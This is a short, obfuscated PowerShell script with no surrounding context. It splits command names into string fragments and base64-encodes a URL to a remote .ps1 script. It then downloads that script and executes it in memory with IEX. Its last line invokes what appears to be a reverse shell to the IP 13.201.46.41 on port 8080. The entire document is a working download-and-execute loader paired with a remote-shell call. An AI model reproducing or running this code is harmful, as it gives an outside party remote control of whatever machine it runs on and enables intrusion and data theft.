$w = &('N'+'ew'+'-Obj'+'ect') System.Net.WebClient
$u = ('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fub255bW91czMwMDUwMi9CZXJ6ZXJrL21haW4vYmVyemVya2VyLnBzMQ==' | % { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_)) })
$m = 'DownloadString'
$s = $w.($m)($u)
&('I'+'EX') $s
&('Invoke-'+'dopeboiShell') 13.201.46.41 8080
